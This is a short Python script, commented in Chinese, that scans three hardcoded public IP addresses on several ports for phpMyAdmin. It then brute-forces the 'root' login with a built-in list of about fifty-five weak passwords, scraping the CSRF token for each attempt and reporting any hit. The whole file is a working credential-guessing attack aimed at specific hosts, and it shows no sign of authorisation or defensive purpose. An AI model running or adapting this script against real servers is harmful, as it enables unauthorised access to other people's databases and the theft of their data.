#!/usr/bin/env python3
"""测新phpMyAdmin目标弱口令"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

targets = ["182.254.209.163", "124.219.96.34", "8.217.180.74"]

def find_pma(ip):
    for port in ["80", "8080", "8980", "9096"]:
        for path in ["/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/phpMyAdmin/"]:
            try:
                req = urllib.request.Request(f"http://{ip}:{port}{path}", headers={"User-Agent":"Mozilla/5.0"})
                r = urllib.request.urlopen(req, timeout=4, context=ctx)
                body = r.read().decode("utf-8","ignore")
                if "phpMyAdmin" in body or "pma_username" in body:
                    return port, path
            except Exception:
                pass
    return None

def try_login(ip, port, path, user, pw):
    for attempt in range(2):
        try:
            cj = http.cookiejar.CookieJar()
            op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
            op.addheaders = [("User-Agent","Mozilla/5.0")]
            base = f"http://{ip}:{port}{path}"
            r = op.open(base, timeout=6)
            html = r.read().decode("utf-8","ignore")
            m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
            if not m: return None
            data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
            op.open(urllib.request.Request(f"{base}index.php", data=data), timeout=6).read()
            r = op.open(f"{base}index.php", timeout=6)
            body = r.read().decode("utf-8","ignore")
            if "Cannot log in" in body or "#1045" in body:
                return "FAIL"
            if "logout" in body or "navigation" in body or "server_databases" in body:
                return "SUCCESS"
            return None
        except Exception:
            if attempt == 1: return "ERR"
            time.sleep(1)
    return "ERR"

pwds = ["123456","root","admin","12345678","mysql","root123","password","123456789",
        "admin123","test","phpstudy","phpStudy","12345","1234567","888888","111111",
        "000000","admin888","mysql123","passw0rd","abc123","123123","654321",
        "1234567890","qwerty","p@ssw0rd","P@ssw0rd","admin@123","www123","web123",
        "phpmyadmin","pma","123456a","Aa123456","a123456","zxcvbnm","qazwsx",
        "admin2018","admin2020","admin2024","admin2026","woaini","5201314",
        "root@123","Root123","root123456","MySQL@123","123qwe","asd123456",
        "123456789a","admin8888","88888888","666666","147258369","987654321"]

for ip in targets:
    found = find_pma(ip)
    if not found:
        print(f"{ip}: 无phpMyAdmin", flush=True)
        continue
    port, path = found
    print(f"{ip}:{port} phpMyAdmin@{path}", flush=True)
    success = False
    for pw in pwds:
        r = try_login(ip, port, path, "root", pw)
        if r == "SUCCESS":
            print(f"!!! {ip}:{port} root/{pw} 登录成功!", flush=True)
            success = True
            break
        time.sleep(0.2)
    if not success:
        print(f"{ip}: 弱口令无命中", flush=True)
print("DONE")
